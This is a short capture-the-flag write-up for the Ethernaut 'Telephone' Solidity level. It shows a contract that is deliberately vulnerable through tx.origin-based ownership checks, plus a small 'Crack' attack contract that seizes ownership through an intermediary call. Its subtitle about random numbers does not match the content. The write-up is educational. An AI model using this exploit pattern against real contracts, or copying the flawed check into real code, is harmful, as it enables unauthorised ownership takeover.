# Ethernaut 04: Telephone - Solidity understanding tx.origin

Learn about random numbers in Solidity

## The Task Intro

tx.origin can cause someone to use their contract and execute something different on your behalf. For example to trick someone to use a malicous contract, that will transfer the persons token without consent to another address (pishing).

Avoid using tx.origin, unless a call like tx.origin==msg.sender, which equals a regular wallet.

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## The Solution

A user A deploys this contract. A direct call to the changeOwner function does not allow anybody to change the owner. BUT:

Anyone else deploying another contract B, that calls contract A changeOwner function, can claim ownership.

Lesson: tx.origin==msg.sender, meaning it is a direct call from a persons wallet, is the only use case of tx.origin.

```apache
contract Crack {
    Telephone tp;

    constructor (Telephone _tp){
        tp=_tp;
    }

    function attack(address newOwner)external{
        tp.changeOwner(newOwner);
    }
}
```
